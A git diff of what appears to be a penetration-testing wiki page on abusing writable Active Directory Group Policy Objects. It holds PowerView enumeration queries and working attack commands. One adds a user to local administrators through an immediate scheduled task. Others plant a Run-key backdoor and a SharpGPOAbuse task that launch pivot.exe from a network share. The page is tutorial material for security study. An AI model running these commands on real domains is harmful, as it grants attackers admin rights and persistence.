@@ -297,9 +297,7 @@ The below indicates that the user `offense\spotless` has **WriteProperty**, **Wr
 
 ![](../../.gitbook/assets/a14.png)
 
-[**More about general AD ACL/ACE abuse here.**](acl-persistence-abuse.md)
-
-### Abusing the GPO Permissions <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
+### Enumerate GPO Permissions <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>
 
 We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:
 
@@ -307,7 +305,7 @@ We know the above ObjectDN from the above screenshot is referring to the `New Gr
 
 If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:
 
-```bash
+```powershell
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 ```
 
@@ -317,7 +315,7 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityRefere
 
 We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:
 
-```
+```powershell
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
 
@@ -325,7 +323,7 @@ Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -A
 
 **Policies Applied to a Given Computer**
 
-```
+```powershell
 Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 ```
 
@@ -333,17 +331,17 @@ Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
 
 **OUs with a Given Policy Applied**
 
-```
+```powershell
 Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
 ```
 
 ![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)
 
-**Abusing Weak GPO Permissions**
+### **Abuse GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)
 
 One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:
 
-```
+```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 
@@ -353,11 +351,36 @@ The above will add our user spotless to the local `administrators` group of the 
 
 ![](../../.gitbook/assets/a20.png)
 
+### &#x20;GroupPolicy module **- Abuse GPO**
+
+{% hint style="info" %}
+You can check to see if the GroupPolicy module is installed with `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. In a pinch, you can install it with `Install-WindowsFeature –Name GPMC` as a local admin.
+{% endhint %}
+
+```powershell
+# Create new GPO and link it with the OU Workstrations
+New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
+# Make the computers inside Workstrations create a new reg key that will execute a backdoor
+## Search a shared folder where you can write and all the computers affected can read
+Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
+```
+
+This payload, after the GPO is updated, will need also someone to login inside the computer.
+
+### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuse GPO**
+
+{% hint style="info" %}
+It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to.
+{% endhint %}
+
+```bash
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
+```
+
 ### Force Policy Update <a href="#force-policy-update" id="force-policy-update"></a>
 
-ScheduledTask and its code will execute after the policy updates are pushed through (roughly each 90 minutes), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
-
-![](../../.gitbook/assets/a21.png)
+The previous abusive **GPO updates are reloaded** roughly each 90 minutes.\
+if you have access to the computer you can force it with `gpupdate /force` .
 
 ### Under the hood <a href="#under-the-hood" id="under-the-hood"></a>
 
